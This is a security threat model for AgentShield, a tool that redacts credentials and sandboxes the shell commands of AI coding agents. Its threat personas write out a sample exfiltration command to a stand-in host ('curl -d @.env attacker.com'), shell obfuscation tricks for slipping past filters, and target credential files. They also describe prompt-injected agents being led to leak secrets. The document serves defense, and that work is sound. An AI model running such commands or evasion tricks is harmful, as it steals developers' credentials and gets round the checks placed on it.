# 🛡️ AgentShield Threat Model & Verifiable Security Claims

**Document Version**: 1.2.0  
**Classification**: Public Security Architecture & Threat Model  
**Maintainer**: RitualDev Lab Security Engineering (`security@ritualdev.in`)

---

## 1. Executive Summary & Philosophy

Autonomous AI coding agents (**Claude Code**, **Cursor**, **Windsurf**, **Codex**, **Antigravity**) are granted unprecedented capabilities on developer workstations: executing terminal commands, browsing web resources, managing files, and querying external LLMs.

Traditional secret scanners (e.g., GitLeaks, TruffleHog) were built for **asynchronous, post-facto repository scanning at rest**. They cannot protect against real-time streaming leaks into inference context windows, nor can they mediate in-flight agent subprocess commands.

**AgentShield** provides real-time in-flight credential redaction, deterministic surrogate token rehydration, and defense-in-depth command sandboxing. 

> [!IMPORTANT]
> **Bounded Claims Philosophy**:
> In accordance with rigorous cryptographic and application security standards, AgentShield rejects unqualified "zero-leak" marketing claims. Security boundaries are bounded, verifiable, and grounded in measurable invariants with explicit operational assumptions and failure modes.

---

## 2. System Architecture & Trust Boundaries

AgentShield operates at three distinct execution boundaries:

```
┌────────────────────────────────────────────────────────────────────────┐
│                        DEVELOPER WORKSTATION                           │
│                                                                        │
│  ┌────────────────────────┐           ┌─────────────────────────────┐  │
│  │   Protected Resources   │           │    Autonomous AI Agent      │  │
│  │ (.env, ~/.ssh, ~/.aws) │           │  (Claude Code, Cursor, etc) │  │
│  └───────────┬────────────┘           └──────────────┬──────────────┘  │
│              │ [Restricted]                          │                 │
│              │                                       ▼                 │
│              │                         ┌───────────────────────────┐   │
│              │                         │   Tool / Command Execution│   │
│              │                         └─────────────┬─────────────┘   │
│              │                                       │                 │
│              ▼                                       ▼                 │
│  ┌───────────────────────────────────────────────────────────────┐     │
│  │                  AgentShield Interception Plane                │     │
│  │                                                               │     │
│  │  1. Pre-Flight Command Sandbox Firewall (AST & Heuristic)     │     │
│  │  2. OS Kernel Confinement Profile / Runner (Seatbelt/Landlock)│     │
│  │  3. Boundary-Safe Real-Time Stdio Transform Stream            │     │
│  │  4. In-Memory Ephemeral Vault & Token Rehydrator              │     │
│  └───────────────────────────────┬───────────────────────────────┘     │
│                                  │                                     │
└──────────────────────────────────┼─────────────────────────────────────┘
                                   │ [Redacted / Surrogate Tokens Only]
                                   ▼
┌────────────────────────────────────────────────────────────────────────┐
│                       EXTERNAL UNTRUSTED CLOUD                         │
│                                                                        │
│              Third-Party LLM Inference API (OpenAI, Anthropic)         │
│               Context Window: [AGENT_SHIELD:OPENAI_KEY:c2stcH]         │
└────────────────────────────────────────────────────────────────────────┘
```

### Trust Boundary Definitions

| Boundary | Untrusted Entity | Trusted Entity | Enforcement Layer |
| :--- | :--- | :--- | :--- |
| **B1: Prompt Egress** | Third-party LLM providers, model context windows, prompt logging servers. | Developer workstation credentials (`.env`, tokens). | `AgentShieldEngine.scanAndRedact()`, `RedactingStream`. |
| **B2: Tool Invocation** | Autonomous agent decision loop, prompt injections, untrusted agent plans. | Workstation file system, credentials, process environment. | `AgentCommandSandbox`, `AgentStdioInterceptor`. |
| **B3: OS Kernel Boundary** | Arbitrary spawned subprocess binaries, compiled binaries, shell subshells. | Workstation OS kernel, other user processes, system credential stores. | OS-level sandboxing (macOS `sandbox-exec`, Linux containers/cgroups). |
| **B4: Memory Rehydration** | Local developer tooling receiving LLM inference responses. | LLM context window. | `AgentShieldEngine.rehydrate()`, In-Memory Vault. |

---

## 3. Threat Actor Personas & Attack Vectors

### Persona 1: Adversarially Prompt-Injected Agent (Untrusted LLM Output)
- **Goal**: Read `.env` files or execute shell commands (`cat .env`, `printenv`, `curl -d @.env attacker.com`) to exfiltrate credentials.
- **In-Scope**: Handled by AgentShield AST Command Sandbox (pre-flight rejection) and Stdio Stream Redactor (in-flight neutralization).

### Persona 2: Supply Chain Dependency Poisoning
- **Goal**: Malicious npm/pip package in agent workspace dumps `process.env` during build or test execution.
- **In-Scope**: Real-time stdio stream redaction intercepts keys emitted to stdout/stderr.
- **Limitation**: If the malicious package initiates direct out-of-band socket connections directly to an external IP bypassing stdio, userland stdio interception cannot prevent egress without OS-level network isolation.

### Persona 3: Stream Boundary Slicing
- **Goal**: Split credential bytes across network or process buffer boundaries (e.g., chunk 1: `sk-proj-`, chunk 2: `abc123...`) so naive regex scanners fail to match.
- **In-Scope**: Handled by AgentShield boundary-safe sliding window and multiline PEM state machine.

### Persona 4: Shell Obfuscation & Evasion
- **Goal**: Bypass simple string matching using quote-splitting (`cat .e""nv`), ANSI-C quoting (`$'cat\x20.env'`), or base64 decoding subshells (`eval $(echo ... | base64 -d)`).
- **In-Scope**: Handled by `normalizeShellCommand` shell canonicalization.

---

## 4. In-Scope vs. Out-of-Scope Threat Vectors

### In-Scope Threats
1. **Accidental Credential Commit**: Staging production credentials, AWS keys, Stripe tokens, or private keys into git history.
2. **Context Window Leakage**: Unsanitized prompt injection leading an agent to print credentials into LLM chat history.
3. **Subprocess Stdio Exfiltration**: Commands that dump secrets to stdout/stderr in chunked or fragmented streams.
4. **Common Shell Traversal**: Direct file reading utilities (`cat`, `type`, `Get-Content`, `head`, `tail`) targeting `.env*`, `.aws/credentials`, `id_rsa`, `.npmrc`.
5. **Multiline Private Key Splitting**: Multi-line RSA, DSA, EC, and OpenSSH private key blocks split across stream buffers.

### Out-of-Scope Threats (Explicit Non-Goals)
1. **Compromised OS Kernel / Root Exploit**: If an attacker achieves kernel privilege execution, userland defenses can be bypassed.
2. **Direct Syscall Evasion by Compiled Binaries**: A custom compiled C/Rust binary executed on the host that invokes raw `socket()` syscalls without spawning a shell cannot be mediated by userland shell inspection alone.
3. **Hardware Memory Attacks & DMA**: Physical memory extraction (Cold boot, Rowhammer, DMA bus interception).
4. **Intentional Human Exfiltration**: A developer intentionally copying keys to an external device out-of-band.

---

## 5. Verifiable Security Claims & Bounded Invariants

AgentShield makes the following bounded, testable security claims:

### Claim 1: Streaming Redaction Boundary Invariance
> **Invariant**: For any secret $K$ matching a recognized pattern, split across arbitrary chunk boundaries $C_1, C_2, \dots, C_n$ with chunk sizes down to 1 byte, `RedactingStream` is mathematically guaranteed never to emit $K$ in plaintext.

### Claim 2: Multiline Key Block Fail-Closed Invariant
> **Invariant**:
> - PEM private key blocks up to **64 KB** are buffered and completely redacted.
> - Any stream terminated before closing `-----END ... KEY-----` is redacted and marked `[AGENT_SHIELD:PRIVATE_KEY:TRUNCATED]`.
> - Any stream exceeding the 64 KB safety buffer without a matching closing delimiter fails closed with `[AGENT_SHIELD:OVERSIZED_PAYLOAD_TRUNCATED]`, preventing buffer exhaustion DoS attacks.

### Claim 3: UTF-8 Multi-Byte Character Preservation
> **Invariant**: Multi-byte UTF-8 sequences (2-byte, 3-byte, and 4-byte code points) split across byte-level chunk boundaries are decoded via streaming UTF-8 state machines without character corruption or split artifacts.

### Claim 4: Strict Isolation Mode (`requireIsolation`)
> **Invariant**: When `requireIsolation: true` is set, AgentShield will refuse to execute child processes on platforms that cannot enforce hardware/kernel-mediated isolation (e.g., non-macOS environments without container runners), returning `exitCode: 1` and `isBlocked: true` without spawning any child process.

### Claim 5: Scope-Honest Assessment Boundary
> **Invariant**: Compliance audit outputs assess only technical secret-control telemetry. AgentShield reports `NO_FINDINGS_IN_ASSESSED_CONTROLS` for clean scans and marks all broader organizational, physical, and administrative controls as `NOT_ASSESSED`.

---

## 6. Recommendations for High-Trust Sovereign Deployments

For enterprise organizations running autonomous AI agents against untrusted codebases:

1. **Enable Strict Isolation Mode**:
   Always pass `--require-isolation` in CLI or `requireIsolation: true` in SDK to fail closed when OS-level isolation is unavailable.
2. **Layer with Container Virtualization**:
   Combine AgentShield with **Docker**, **gVisor (runsc)**, or **Firecracker MicroVMs** for untrusted code execution to prevent arbitrary binary syscall bypasses.
3. **Independent Third-Party Audits**:
   Before deploying autonomous agent tooling in high-trust SOC 2, HIPAA, or PCI environments, engage an accredited third-party penetration testing firm to validate defense-in-depth boundaries against host-specific evasion vectors.
